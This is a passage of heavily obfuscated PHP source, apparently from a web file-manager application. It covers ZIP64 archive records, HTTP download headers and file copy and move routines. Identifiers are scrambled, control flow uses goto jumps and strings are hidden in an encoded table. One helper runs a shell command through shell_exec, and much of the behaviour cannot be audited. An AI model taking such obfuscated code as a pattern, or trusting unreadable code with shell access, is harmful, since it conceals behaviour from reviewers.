array($fêÌä‡±óâ[1972], $fÛáŸñã”ô), array($fêÌä‡±óâ[1972], $E¿ö≤…é‡◊), array($fêÌä‡±óâ[1972], $f“ôß›•õ“), array($fêÌä‡±óâ[1970], 0)); goto FÒ¢àæû—•; A‰‘Ç‰Ø·Ï: $fêÌä‡±óâ =& $_SERVER[Æ¡î¢≠¯™]; list($A¡øÉπ‘±í, $DΩ®’îøçÖ, $cºÁ∂ÏÌîê, $E¿ö≤…é‡◊, $fÛáŸñã”ô, $f“ôß›•õ“) = $AÔ‹∑»à†Ÿ; $F¢€…ï„ˆ∏ = $fêÌä‡±óâ[33]; goto Aæ“®êﬁËî; DíÆ˜‘âÍß: } protected function addCdr64Eof() { goto BåœÑ≈”ùî; bÒòî¯≈ØÌ: $this->send($d›ÎÊáÁôº); goto fëìÇ’”ÊÏ; BåœÑ≈”ùî: $E„Ê®„ùı¢ =& $_SERVER[Æ¡î¢≠¯™]; $b‡Çƒöæâì = count($this->files); $fµúßç‹ÂÁ = $this->cdr_ofs; goto Bñ÷⁄⁄ÁÏØ; Bñ÷⁄⁄ÁÏØ: $fº‡É–ﬂ¬§ = $this->ofs; $B·ôåÇ‰®È = array(array($E„Ê®„ùı¢[1970], static::ZIP64_CDR_EOF_SIGNATURE), array($E„Ê®„ùı¢[1972], 44), array($E„Ê®„ùı¢[1971], static::ZIP_VERSION_64), array($E„Ê®„ùı¢[1971], static::ZIP_VERSION_64), array($E„Ê®„ùı¢[1970], 0), array($E„Ê®„ùı¢[1970], 0), array($E„Ê®„ùı¢[1972], $b‡Çƒöæâì), array($E„Ê®„ùı¢[1972], $b‡Çƒöæâì), array($E„Ê®„ùı¢[1972], $fµúßç‹ÂÁ), array($E„Ê®„ùı¢[1972], $fº‡É–ﬂ¬§)); $d›ÎÊáÁôº = $this->packFields($B·ôåÇ‰®È); goto bÒòî¯≈ØÌ; fëìÇ’”ÊÏ: } protected function addCdr64Locator() { goto aäõêïä”»; bâ∞„ì–ëç: $this->send($B ‰áÁö∆ë); goto CçÈÜıãÌﬂ; aäõêïä”»: $BÍ…ú‡˜î‡ =& $_SERVER[Æ¡î¢≠¯™]; $AÉ≤‚çÑÃò = count($this->files); $E∫¨Œ∂–·Ù = $this->cdr_ofs; goto eÌÎ€ÕüÀâ; eÌÎ€ÕüÀâ: $cµæ‹ç£¯ú = $this->ofs; $aî°ŒœçúÇ = array(array($BÍ…ú‡˜î‡[1970], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($BÍ…ú‡˜î‡[1970], 0), array($BÍ…ú‡˜î‡[1972], $cµæ‹ç£¯ú + $E∫¨Œ∂–·Ù), array($BÍ…ú‡˜î‡[1970], 1)); $B ‰áÁö∆ë = $this->packFields($aî°ŒœçúÇ); goto bâ∞„ì–ëç; CçÈÜıãÌﬂ: } protected function addCdrEof() { goto E›è¬ﬁŒÑÃ; C∞±‹É’äÒ: $fπ÷•´™¯À = $this->packFields($cÿè¥∞ îÚ) . $eëêﬁÔ∫é®; $this->send($fπ÷•´™¯À); goto Dìì≠íÒ‹¡; E›è¬ﬁŒÑÃ: $Dƒ˘óÙ∫ÿÈ =& $_SERVER[Æ¡î¢≠¯™]; $cé“ïﬁ„ëõ = count($this->files); $fã∞•Ùëã£ = $this->cdr_ofs; goto AΩﬂ°®æ®¯; AΩﬂ°®æ®¯: $A√©ãïÖÊ  = $this->ofs; $eëêﬁÔ∫é® = $Dƒ˘óÙ∫ÿÈ[33]; $cÿè¥∞ îÚ = array(array($Dƒ˘óÙ∫ÿÈ[1970], static::CDR_EOF_SIGNATURE), array($Dƒ˘óÙ∫ÿÈ[1971], 0), array($Dƒ˘óÙ∫ÿÈ[1971], 0), array($Dƒ˘óÙ∫ÿÈ[1971], $cé“ïﬁ„ëõ), array($Dƒ˘óÙ∫ÿÈ[1971], $cé“ïﬁ„ëõ), array($Dƒ˘óÙ∫ÿÈ[1970], 4294967295), array($Dƒ˘óÙ∫ÿÈ[1970], 4294967295), array($Dƒ˘óÙ∫ÿÈ[1971], strlen($eëêﬁÔ∫é®))); goto C∞±‹É’äÒ; Dìì≠íÒ‹¡: } protected function addCdr() { foreach ($this->files as $Bò›ò…⁄£É) { $this->addCdrFile($Bò›ò…⁄£É); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $c°Ôô¿∫ÍÇ =& $_SERVER[Æ¡î¢≠¯™]; $DÒŸ£Â˘ß¡ = $c°Ôô¿∫ÍÇ[209]; if ($this->outputName) { $FÇÇÒç‘ÖÊ = trim(str_replace(array($c°Ôô¿∫ÍÇ[123], $c°Ôô¿∫ÍÇ[55], $c°Ôô¿∫ÍÇ[105], $c°Ôô¿∫ÍÇ[77], $c°Ôô¿∫ÍÇ[62], $c°Ôô¿∫ÍÇ[978]), $c°Ôô¿∫ÍÇ[33], $this->outputName)); $b˘å¥Úàóø = rawurlencode($FÇÇÒç‘ÖÊ); $DÒŸ£Â˘ß¡ .= "\x3b\x20\146\151\154\x65\156\141\155\145\52\75\165\164\x66\x2d\70\x27\47{$b˘å¥Úàóø}"; } $CÈß”õ˘íÉ = array($c°Ôô¿∫ÍÇ[206] => $c°Ôô¿∫ÍÇ[1973], $c°Ôô¿∫ÍÇ[1974] => $DÒŸ£Â˘ß¡, $c°Ôô¿∫ÍÇ[1975] => $c°Ôô¿∫ÍÇ[1976], $c°Ôô¿∫ÍÇ[1977] => $c°Ôô¿∫ÍÇ[1978], $c°Ôô¿∫ÍÇ[1979] => $c°Ôô¿∫ÍÇ[1980]); foreach ($CÈß”õ˘íÉ as $Cô›ÇÓœñ˜ => $c∆ŒÓ∆ÁíÎ) { header($Cô›ÇÓœñ˜ . $c°Ôô¿∫ÍÇ[868] . $c∆ŒÓ∆ÁíÎ); } } protected function send($EøìÈ•ª∞Ü) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $EøìÈ•ª∞Ü); } protected final function dosTime($A«›óæä–«) { $b…ÿçîÒ‚— =& $_SERVER[Æ¡î¢≠¯™]; $BÉ•≤µŒ›ÿ = getdate($A«›óæä–«); if ($BÉ•≤µŒ›ÿ[$b…ÿçîÒ‚—[1682]] < 1980) { $BÉ•≤µŒ›ÿ = array($b…ÿçîÒ‚—[1682] => 1980, $b…ÿçîÒ‚—[1981] => 1, $b…ÿçîÒ‚—[1982] => 1, $b…ÿçîÒ‚—[1983] => 0, $b…ÿçîÒ‚—[1984] => 0, $b…ÿçîÒ‚—[1985] => 0); } $BÉ•≤µŒ›ÿ[$b…ÿçîÒ‚—[1682]] -= 1980; return $BÉ•≤µŒ›ÿ[$b…ÿçîÒ‚—[1682]] << 25 | $BÉ•≤µŒ›ÿ[$b…ÿçîÒ‚—[1981]] << 21 | $BÉ•≤µŒ›ÿ[$b…ÿçîÒ‚—[1982]] << 16 | $BÉ•≤µŒ›ÿ[$b…ÿçîÒ‚—[1983]] << 11 | $BÉ•≤µŒ›ÿ[$b…ÿçîÒ‚—[1984]] << 5 | $BÉ•≤µŒ›ÿ[$b…ÿçîÒ‚—[1985]] >> 1; } protected function packFields($Eê°ñíπ¿Ì) { $DµÖ—ﬁœØÜ =& $_SERVER[Æ¡î¢≠¯™]; $fßÏπç √ü = $DµÖ—ﬁœØÜ[33]; $a∆ø∞ﬁ¨ßµ = array(); foreach ($Eê°ñíπ¿Ì as $c¥≠Øìû–˜) { $fßÏπç √ü .= $c¥≠Øìû–˜[0]; $a∆ø∞ﬁ¨ßµ[] = $c¥≠Øìû–˜[1]; } array_unshift($a∆ø∞ﬁ¨ßµ, $fßÏπç √ü); return call_user_func_array($DµÖ—ﬁœØÜ[1986], $a∆ø∞ﬁ¨ßµ); } protected function filterFilename($f©Îç «Áµ) { $dã‘àˆ√´ =& $_SERVER[Æ¡î¢≠¯™]; return str_replace(array($dã‘àˆ√´[105], $dã‘àˆ√´[4], $dã‘àˆ√´[183], $dã‘àˆ√´[79], $dã‘àˆ√´[123], $dã‘àˆ√´[913], $dã‘àˆ√´[916], $dã‘àˆ√´[277]), $dã‘àˆ√´[80], $f©Îç «Áµ); } } class ZipStream { } goto c∞°Ò¿“ºë; cäàπ¡›‰Î: function ActionCall($aú¨¿ì´ì◊) { $dΩÓ¿©¬øΩ = array_slice(func_get_args(), 1); return ActionApply($aú¨¿ì´ì◊, $dΩÓ¿©¬øΩ); } function ActionCallApi($aîÂ¶´Ñ·Ò, $eäà“ΩÉ¬⁄ = '') { goto cÎüÜÀ¯Âé; cÎüÜÀ¯Âé: $DÛ»¬ª√ûì =& $_SERVER[âñö‚‚Ñ]; $c”ƒÈìèÍﬁ = $eäà“ΩÉ¬⁄; if (is_array($eäà“ΩÉ¬⁄)) { $c”ƒÈìèÍﬁ = $DÛ»¬ª√ûì[20]; foreach ($eäà“ΩÉ¬⁄ as $B§Ôﬁßûû˘ => $E◊Ø¿ŸÇßÿ) { $E◊Ø¿ŸÇßÿ = is_array($E◊Ø¿ŸÇßÿ) ? json_encode($E◊Ø¿ŸÇßÿ) : $E◊Ø¿ŸÇßÿ; $E◊Ø¿ŸÇßÿ = is_bool($E◊Ø¿ŸÇßÿ) ? intval($E◊Ø¿ŸÇßÿ) : $E◊Ø¿ŸÇßÿ; $c”ƒÈìèÍﬁ .= $DÛ»¬ª√ûì[21] . $B§Ôﬁßûû˘ . $DÛ»¬ª√ûì[22] . rawurlencode($E◊Ø¿ŸÇßÿ); } } goto b∂∫ÇÎ«Ü; dÉâÜ¯Ü’π: return $f‡©òä®ïÒ; goto BÏ€ﬂÍê∂Ê; c¡ É“ªºÒ: $a¡ﬁû›âº∏ = phpBinCommand(); if ($a¡ﬁû›âº∏ && function_exists($DÛ»¬ª√ûì[25])) { $d‚÷‹¡ÔÑı = $a¡ﬁû›âº∏ . $DÛ»¬ª√ûì[26] . BASIC_PATH . $DÛ»¬ª√ûì[27] . escapeshellarg($aîÂ¶´Ñ·Ò); $E£œÀﬁâºã = shell_exec($d‚÷‹¡ÔÑı); } if (!$E£œÀﬁâºã) { $bä‚ÔóíòÈ = stream_context_create(array($DÛ»¬ª√ûì[28] => array($DÛ»¬ª√ûì[29] => 20, $DÛ»¬ª√ûì[30] => $DÛ»¬ª√ûì[31]))); $E£œÀﬁâºã = file_get_contents(APP_HOST . $DÛ»¬ª√ûì[32] . $aîÂ¶´Ñ·Ò, !1, $bä‚ÔóíòÈ); } goto EñÓ‰‚∏íœ; EñÓ‰‚∏íœ: $B¥Ø«“¬ôÔ = json_decode($E£œÀﬁâºã, !0); $f‡©òä®ïÒ = is_array($B¥Ø«“¬ôÔ) ? $B¥Ø«“¬ôÔ : array($DÛ»¬ª√ûì[33] => null, $DÛ»¬ª√ûì[34] => $E£œÀﬁâºã); if (!$B¥Ø«“¬ôÔ) { echo $E£œÀﬁâºã; } goto dÉâÜ¯Ü’π; b∂∫ÇÎ«Ü: $eûÁìœ·äÉ = Action($DÛ»¬ª√ûì[23])->accessToken(); $aîÂ¶´Ñ·Ò = str_replace($DÛ»¬ª√ûì[5], $DÛ»¬ª√ûì[4], $aîÂ¶´Ñ·Ò) . $DÛ»¬ª√ûì[24] . $eûÁìœ·äÉ . $c”ƒÈìèÍﬁ; $E£œÀﬁâºã = $DÛ»¬ª√ûì[20]; goto c¡ É“ªºÒ; BÏ€ﬂÍê∂Ê: } function ActionCallHook($FÖœËó‘Ù◊) { goto Eﬂ™ìª§ ⁄; AÍÀΩ—¨∞ª: $A√Æﬂù·∑∆ = $få•ÓµıÈí ? json_decode($få•ÓµıÈí, !0) : $A√Æﬂù·∑∆; $GLOBALS[$DÕ™ú∑è∫è[35]] = 0; return $A√Æﬂù·∑∆; goto bÕàΩ¥Ü” ; Eﬂ™ìª§ ⁄: $DÕ™ú∑è∫è =& $_SERVER[âñö‚‚Ñ]; ob_start(); $d—äÑ¡¡ÚÉ = array_slice(func_get_args(), 1); goto bŒã‡›√éä; bŒã‡›√éä: $GLOBALS[$DÕ™ú∑è∫è[35]] = 1; $A√Æﬂù·∑∆ = ActionApply($FÖœËó‘Ù◊, $d—äÑ¡¡ÚÉ); $få•ÓµıÈí = ob_get_clean(); goto AÍÀΩ—¨∞ª; bÕàΩ¥Ü” : } goto Bπ≠§õÙ≥π; fıÁ÷Ñë¬: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($fÌÉâ™¨¿œ, $eöêÖ¬ŸÉÖ) { $aΩúÓı¢√„ = self::driverMake($eöêÖ¬ŸÉÖ[0]); if (method_exists($aΩúÓı¢√„, $fÌÉâ™¨¿œ)) { return @call_user_func_array(array($aΩúÓı¢√„, $fÌÉâ™¨¿œ), $eöêÖ¬ŸÉÖ); } if (method_exists($aΩúÓı¢√„, $_SERVER[Æ¡î¢≠¯™][983])) { return @call_user_func_array(array($aΩúÓı¢√„, $fÌÉâ™¨¿œ), $eöêÖ¬ŸÉÖ); } else { if (method_exists(self, $fÌÉâ™¨¿œ)) { return @call_user_func_array(array(self, $fÌÉâ™¨¿œ), $eöêÖ¬ŸÉÖ); } else { call_user_func_array(array(parent, $fÌÉâ™¨¿œ), $eöêÖ¬ŸÉÖ); } } } public static function init($aÒ…ÛÓ≠≤Ô) { return self::driverMake($aÒ…ÛÓ≠≤Ô); } public static function copy($F á∫áΩó⁄, $D·àªÉﬂ æ, $aƒèÎÉ√†¿ = false, $f¶◊û∆˜—Ñ = false) { return self::copyMove($F á∫áΩó⁄, $D·àªÉﬂ æ, $aƒèÎÉ√†¿, $_SERVER[Æ¡î¢≠¯™][494], $f¶◊û∆˜—Ñ); } public static function move($cÑãÖ∞Øå∑, $Bµ¡ÿ®˜°≈, $a‘Ú÷Çº©ó = false, $E‰äèÈ–°± = false) { return self::copyMove($cÑãÖ∞Øå∑, $Bµ¡ÿ®˜°≈, $a‘Ú÷Çº©ó, $_SERVER[Æ¡î¢≠¯™][496], $E‰äèÈ–°±); } public static function saveFile($B◊§à§≥, $Cƒ«¢„„å™, $e¬∞ºëÙÌ™ = true) { goto b”À…∆ï€≥; b”À…∆ï€≥: $aΩô÷„Û¬— =& $_SERVER[Æ¡î¢≠¯™]; $EÓ§”Ï›√Á = self::info($Cƒ«¢„„å™); $c¯°°»úÇƒ = self::driverMake($B◊§à§≥); goto BêıüﬂÏìÓ; BêıüﬂÏìÓ: $b…î•Ì‹àæ = self::driverMake($Cƒ«¢„„å™); $b∂£ﬂËË¬û = !1; if ($b…î•Ì‹àæ->pathParse[$aΩô÷„Û¬—[984]]) { $cÎâÙ∏Ì∫Ü = $b…î•Ì‹àæ->pathParse[$aΩô÷„Û¬—[984]]; $b∂£ﬂËË¬û = $b…î•Ì‹àæ; $b…î•Ì‹àæ = self::driverMake($cÎâÙ∏Ì∫Ü); } goto eÈΩË¥‚Ñœ; eÈΩË¥‚Ñœ: $CÉˆ„ñ”Ôù = $b…î•Ì‹àæ->pathFather($Cƒ«¢„„å™); $AÕåå≥ﬂÀ¢ = !0; if (!$e¬∞ºëÙÌ™ && self::driverIsSame($c¯°°»úÇƒ, $b…î•Ì‹àæ)) { $AÕåå≥ﬂÀ¢ = !1; } goto eéâ™ÓåÖÿ; eéâ™ÓåÖÿ: $Aû¯∆Âöå = self::copyFile($c¯°°»úÇƒ, $B◊§à§≥, $b…î•Ì‹àæ, $CÉˆ„ñ”Ôù, $EÓ§”Ï›√Á[$aΩô÷„Û¬—[28]], $AÕåå≥ﬂÀ¢); if ($b∂£ﬂËË¬û) { $Aû¯∆Âöå = $b∂£ﬂËË¬û->getPathOuter($Aû¯∆Âöå); } return $Aû¯∆Âöå; goto b≠ñ”≤èƒÑ; b≠ñ”≤èƒÑ: } private static function copyMove($a§¿„¿‚ì, $c◊ÕÜÖäß¬, $B—À¿Æ‘µÊ, $e≥å©“≠Íé, $c‰Ùè∞Âë  = false) { goto Aƒ®¥’÷⁄‚; e§Ñ≤⁄„«£: $C£∞âå¯¶Ì = $F¢ò∞ÈÊÔ±->isFile($a§¿„¿‚ì); if (!$C£∞âå¯¶Ì && $AÔªËí¬‚¥->getType() == $bâ£◊õ§©œ[686] && $F¢ò∞ÈÊÔ±->getType() == $bâ£◊õ§©œ[113]) { $bê‘ŸóŸùπ = $AÔªËí¬‚¥->copyFolderFromIO($F¢ò∞ÈÊÔ±, $a§¿„¿‚ì, $c◊ÕÜÖäß¬, $B—À¿Æ‘µÊ, $Fä¡Ãª◊≤ó, $c‰Ùè∞Âë ); } else { $bê‘ŸóŸùπ = self::copyPath($F¢ò∞ÈÊÔ±, $a§¿„¿‚ì, $AÔªËí¬‚¥, $c◊ÕÜÖäß¬, $B—À¿Æ‘µÊ, $Fä¡Ãª◊≤ó, $C£∞âå¯¶Ì, $c‰Ùè∞Âë ); } if ($bê‘ŸóŸùπ && $Fä¡Ãª◊≤ó) { $F¢ò∞ÈÊÔ±->remove($a§¿„¿‚ì); } goto dÀ¥¨©‚¬¶; dÇ‰∂¥≤∑Õ: $a°õöÒÜé… = !1; if ($AÔªËí¬‚¥->pathParse[$bâ£◊õ§©œ[984]]) { $c◊ÕÜÖäß¬ = $AÔªËí¬‚¥->pathParse[$bâ£◊õ§©œ[984]]; $a°õöÒÜé… = $AÔªËí¬‚¥; $AÔªËí¬‚¥ = self::driverMake($c◊ÕÜÖäß¬); } self::check($F¢ò∞ÈÊÔ±, $a§¿„¿‚ì, $AÔªËí¬‚¥, $c◊ÕÜÖäß¬); goto a•Õã…≤ÏÛ; a•Õã…≤ÏÛ: Hook::trigger($bâ£◊õ§©œ[82], $F¢ò∞ÈÊÔ±, $a§¿„¿‚ì, $AÔªËí¬‚¥, $c◊ÕÜÖäß¬); $BÈÊæë“À = self::driverIsSame($F¢ò∞ÈÊÔ±, $AÔªËí¬‚¥); if ($BÈÊæë“À) { if ($e≥å©“≠Íé == $bâ£◊õ§©œ[496] && trim($c◊ÕÜÖäß¬, $bâ£◊õ§©œ[8]) == trim($AÔªËí¬‚¥->pathFather($a§¿„¿‚ì), $bâ£◊õ§©œ[8])) { return $AÔªËí¬‚¥->getPathOuter($a§¿„¿‚ì); } if (method_exists($AÔªËí¬‚¥, $e≥å©“≠Íé)) { return $AÔªËí¬‚¥->{$e≥å©“≠Íé}($a§¿„¿‚ì, $c◊ÕÜÖäß¬, $B—À¿Æ‘µÊ); } } goto e§Ñ≤⁄„«£; a∂óô¿◊Ã: $F¢ò∞ÈÊÔ± = self::driverMake($a§¿„¿‚ì); $AÔªËí¬‚¥ = self::driverMake($c◊ÕÜÖäß¬); $Fä¡Ãª◊≤ó = $e≥å©“≠Íé == $bâ£◊õ§©œ[496]; goto dÇ‰∂¥≤∑Õ; Aƒ®¥’÷⁄‚: $bâ£◊õ§©œ =& $_SERVER[Æ¡î¢≠¯™]; if (!$a§¿„¿‚ì || $a§¿„¿‚ì == $bâ£◊õ§©œ[8] || !$c◊ÕÜÖäß¬) { return !1; } ignore_timeout(); goto a∂óô¿◊Ã; dÀ¥¨©‚¬¶: if ($a°õöÒÜé…) { $bê‘ŸóŸùπ = $a°õöÒÜé…->getPathOuter($bê‘ŸóŸùπ); } return $bê‘ŸóŸùπ; goto A¶”¨Ì∫“ç; A¶”¨Ì∫“ç: } private static function check($cÓùÑÚæ∞’, $aıÁ–©Ñ†°, $dâÑïòë∞¿, &$BÑ·Ó∞©´Ö) { $C©¯‘ú∆Ûœ =& $_SERVER[Æ¡î¢≠¯™]; if (self::driverIsSame($cÓùÑÚæ∞’, $dâÑïòë∞¿) && $cÓùÑÚæ∞’->isFolder($aıÁ–©Ñ†°) && $cÓùÑÚæ∞’->isParentOf($aıÁ–©Ñ†°, $BÑ·Ó∞©´Ö)) { show_json(LNG($C©¯‘ú∆Ûœ[985]), !1); } if (!$cÓùÑÚæ∞’->exist($aıÁ–©Ñ†°)) { show_json(LNG($C©¯‘ú∆Ûœ[112]), !1); } } private static function copyPath($d≠±ÆƒîäÇ, $f¥∞´•âÚß, $A≠÷¿Ëé¿ª, $d≤÷ã¬‰âƒ, $aëÛÛ–ﬁÉø, $Dé§úïè∞Ô, $f µß€á˘∂, $c≠æßÊ∏¯á = false) { goto DüüßÒ™â˘; DÕä™ÿΩÚë: $aÀœ‰ŸÁıŸ = $A≠÷¿Ëé¿ª->mkdir($A≠÷¿Ëé¿ª->getPath($e◊–ÉΩ™ôâ)); $d≤÷ã¬‰âƒ = $A≠÷¿Ëé¿ª->getPathInner($aÀœ‰ŸÁıŸ); $c∫·ûıÚºß = $d≠±ÆƒîäÇ->listPath($f¥∞´•âÚß, !0); goto b‚≠≥–Óã∂; b‚≠≥–Óã∂: $bü◊çÏéÆû = array_merge($c∫·ûıÚºß[$d∂—£ûª∞â[83]], $c∫·ûıÚºß[$d∂—£ûª∞â[84]]); foreach ($bü◊çÏéÆû as $d‘ãóÃ¬Ë) { $eú¥ƒàƒã÷ = $d‘ãóÃ¬Ë[$d∂—£ûª∞â[29]] == $d∂—£ûª∞â[174]; $f¥∞´•âÚß = $d≠±ÆƒîäÇ->getPathInner($d‘ãóÃ¬Ë[$d∂—£ûª∞â[85]]); $D§ÍÓŸä€ = self::copyPath($d≠±ÆƒîäÇ, $f¥∞´•âÚß, $A≠÷¿Ëé¿ª, $d≤÷ã¬‰âƒ, $aëÛÛ–ﬁÉø, $Dé§úïè∞Ô, $eú¥ƒàƒã÷); if (!$D§ÍÓŸä€) { write_log($d∂—£ûª∞â[986] . $f¥∞´•âÚß . $d∂—£ûª∞â[987] . $d≤÷ã¬‰âƒ, $d∂—£ûª∞â[988]); } } return $aÀœ‰ŸÁıŸ; goto CÂƒàŸ¢Á¬; DüüßÒ™â˘: $d∂—£ûª∞â =& $_SERVER[Æ¡î¢≠¯™]; $BÙäú¢‹ﬂº = $c≠æßÊ∏¯á ? $c≠æßÊ∏¯á : $d≠±ÆƒîäÇ->getPathName($d≠±ÆƒîäÇ->pathThis($f¥∞´•âÚß)); if ($aëÛÛ–ﬁÉø) { $Cœ◊ûèÔ›„ = $A≠÷¿Ëé¿ª->fileNameExist($d≤÷ã¬‰âƒ, $BÙäú¢‹ﬂº); $BÙäú¢‹ﬂº = $A≠÷¿Ëé¿ª->fileNameAuto($d≤÷ã¬‰âƒ, $BÙäú¢‹ﬂº, $aëÛÛ–ﬁÉø, !$f µß€á˘∂); $aëÛÛ–ﬁÉø = $Cœ◊ûèÔ›„ ? $aëÛÛ–ﬁÉø : !1; } goto e’Î£õö¶≥; e’Î£õö¶≥: if ($f µß€á˘∂) { return self::copyFile($d≠±ÆƒîäÇ, $f¥∞´•âÚß, $A≠÷¿Ëé¿ª, $d≤÷ã¬‰âƒ, $BÙäú¢‹ﬂº, $Dé§úïè∞Ô); } if ($aëÛÛ–ﬁÉø == REPEAT_RENAME_FOLDER) { $aëÛÛ–ﬁÉø = !1; } $e◊–ÉΩ™ôâ = rtrim($d≤÷ã¬‰âƒ, $d∂—£ûª∞â[8]) . $d∂—£ûª∞â[8] . $BÙäú¢‹ﬂº; goto DÕä™ÿΩÚë; CÂƒàŸ¢Á¬: } private static function copyFile($f—å˜⁄´∆∑, $Fé±“ÁÑ˘, $Aπ«™œçœã, $eÖ—¥ÌìºÚ, $c—ã—íÕÒœ, $e≈èΩ–¯©â) { goto Bì®çìŒâˆ; aŒ„–¬‰√ˆ: Hook::trigger($E˘¥ä¿›âÍ[990], $f—å˜⁄´∆∑, $Fé±“ÁÑ˘, $Aπ«™œçœã, $eÖ—¥ÌìºÚ, $c—ã—íÕÒœ, $DíÔë‘⁄çü); if (self::driverIsSame($f—å˜⁄´∆∑, $Aπ«™œçœã)) { if ($e≈èΩ–¯©â) { $BêÎâÜﬂ⁄‚ = $Aπ«™œçœã->moveFile($Fé±“ÁÑ˘, $eÖ—¥ÌìºÚ); } else { $BêÎâÜﬂ⁄‚ = $Aπ«™œçœã->copyFile($Fé±“ÁÑ˘, $eÖ—¥ÌìºÚ); } Hook::trigger($E˘¥ä¿›âÍ[991], $f—å˜⁄´∆∑, $Fé±“ÁÑ˘, $Aπ«™œçœã, $eÖ—¥ÌìºÚ, $c—ã—íÕÒœ, $BêÎâÜﬂ⁄‚); return $BêÎâÜﬂ⁄‚; } $A£ÃÈ‚èîü = TEMP_FILES; goto Fº†»Øı®∑; a€òÑ≠íÇ√: Hook::trigger($E˘¥ä¿›âÍ[991], $f—å˜⁄´∆∑, $Fé±“ÁÑ˘, $Aπ«™œçœã, $eÖ—¥ÌìºÚ, $c—ã—íÕÒœ, $BêÎâÜﬂ⁄‚); return $BêÎâÜﬂ⁄‚; goto aªÚ≠Í“ıŒ; Bì®çìŒâˆ: $E˘¥ä¿›âÍ =& $_SERVER[Æ¡î¢≠¯™]; $eÖ—¥ÌìºÚ = $Aπ«™œçœã->getPath(rtrim($eÖ—¥ÌìºÚ, $E˘¥ä¿›âÍ[8]) . $E˘¥ä¿›âÍ[8] . $c—ã—íÕÒœ); $DíÔë‘⁄çü = $E˘¥ä¿›âÍ[989] . time() . rand_string(5); goto aŒ„–¬‰√ˆ; Fº†»Øı®∑: mk_dir($A£ÃÈ‚èîü); $BâÖ¢√çπ€ = $A£ÃÈ‚èîü . $DíÔë‘⁄çü; $BâÖ¢√çπ€ = $f—å˜⁄´∆∑->download($Fé±“ÁÑ˘, $BâÖ¢√çπ€); goto A‹áéıÿñ–; A‹áéıÿñ–: $BâÖ¢√çπ€ = $f—å˜⁄´∆∑->iconvApp($BâÖ¢√çπ€); $BêÎâÜﬂ⁄‚ = $Aπ«™œçœã->upload($eÖ—¥ÌìºÚ, $BâÖ¢√çπ€, $e≈èΩ–¯©â); self::remove($A£ÃÈ‚èîü . $DíÔë‘⁄çü); goto a€òÑ≠íÇ√; aªÚ≠Í“ıŒ: } public static function pathFather($A´…øÌò„≥) { $F∂∞ëùï™≥ = IO::init($A´…øÌò„≥); $BëÏ„Ü›Ê÷ = $F∂∞ëùï™≥->pathFather($F∂∞ëùï™≥->path); return $F∂∞ëùï™≥->getPathOuter($BëÏ„Ü›Ê÷); } public static function fileOut($D†…ÌŸÙ∞–, $E„◊Ï¿¡¶‰ = false, $f±ì»€Ò∫ü = false, $C‚®àø˘π· = '') { $d¬äö®òï÷ = self::driverMake($D†…ÌŸÙ∞–); if ($d¬äö®òï÷->isFileOutServer()) { return $d¬äö®òï÷->fileOutServer($D†…ÌŸÙ∞–, $E„◊Ï¿¡¶‰, $f±ì»€Ò∫ü, $C‚®àø˘π·); } return $d¬äö®òï÷->fileOut($D†…ÌŸÙ∞–, $E„◊Ï¿¡¶‰, $f±ì»€Ò∫ü, $C‚®àø˘π·); } public static function fileOutImage($FÇÎ£â™∑Ó, $BÂÒæ≈≈òã = 250) { $AπœºÔë„Ÿ = array(250, 600, 1200, 3000); for ($B∏‰Ø¶ö⁄∆ = 0; $B∏‰Ø¶ö⁄∆ < count($AπœºÔë„Ÿ); $B∏‰Ø¶ö⁄∆++) { if ($B∏‰Ø¶ö⁄∆ == 0 && $BÂÒæ≈≈òã <= $AπœºÔë„Ÿ[$B∏‰Ø¶ö⁄∆]) { $BÂÒæ≈≈òã = $AπœºÔë„Ÿ[$B∏‰Ø¶ö⁄∆]; break; } else { if ($BÂÒæ≈≈òã > $AπœºÔë„Ÿ[$B∏‰Ø¶ö⁄∆ - 1] && $BÂÒæ≈≈òã <= $AπœºÔë„Ÿ[$B∏‰Ø¶ö⁄∆]) { $BÂÒæ≈≈òã = $AπœºÔë„Ÿ[$B∏‰Ø¶ö⁄∆]; break; } else { if ($B∏‰Ø¶ö⁄∆ == count($AπœºÔë„Ÿ) - 1 && $BÂÒæ≈≈òã > $AπœºÔë„Ÿ[$B∏‰Ø¶ö⁄∆]) { $BÂÒæ≈≈òã = $AπœºÔë„Ÿ[$B∏‰Ø¶ö⁄∆]; break; } } } } $a¢‚◊∫÷≥« = self::driverMake($FÇÎ£â™∑Ó); if ($a¢‚◊∫÷≥«->isFileOutServer()) { return $a¢‚◊∫÷≥«->fileOutImageServer($FÇÎ£â™∑Ó, $BÂÒæ≈≈òã); } return $a¢‚◊∫÷≥«->fileOutImage($FÇÎ£â™∑Ó, $BÂÒæ≈≈òã); } private static function driverIsSame($aì≥˘ƒæì…, $e«˘©áÏó¢) { goto bΩ∫©ºÕüí; bΩ∫©ºÕüí: $E∏•ÑÖÇ˘ï =& $_SERVER[Æ¡î¢≠¯™]; $e—ìÃ≥ßﬂ¿ = $aì≥˘ƒæì…->getType(); $E°ÜœíÑ‰£ = $e«˘©áÏó¢->getType(); goto d¶Òì›ê›Æ; d¶Òì›ê›Æ: if ($e—ìÃ≥ßﬂ¿ != $E°ÜœíÑ‰£) { return !1; } if ($e—ìÃ≥ßﬂ¿ == $E∏•ÑÖÇ˘ï[686]) { return !0; } if ($e—ìÃ≥ßﬂ¿ == $E∏•ÑÖÇ˘ï[113]) { return !0; } goto C£ëÍÏª•ù; C£ëÍÏª•ù: if ($aì≥˘ƒæì…->pathDriver == $e«˘©áÏó¢->pathDriver) { return !0; } return !1; goto A£Çı¡Ùä®; A£Çı¡Ùä®: } public static function copyUpdate($Câ¿Ì›π∂Ø, $EÉÊíÍŸ†∂) { goto Eıﬁ≤∆ÀÇ¢; A» ∑¬É≤é: Hook::trigger($aíÚÉ°≠«Ë[995], $Câ¿Ì›π∂Ø, $EÉÊíÍŸ†∂, $Eé¡±±•≤°); foreach ($fÕè‡§¿î≠ as $Bô¯ñ‚áÚü) { IO::mkdir($Bô¯ñ‚áÚü); } foreach ($D”∫áπ»‚ë as $Bô¯ñ‚áÚü) { IO::copy($Bô¯ñ‚áÚü[$aíÚÉ°≠«Ë[992]], $Bô¯ñ‚áÚü[$aíÚÉ°≠«Ë[993]], REPEAT_REPLACE); } goto 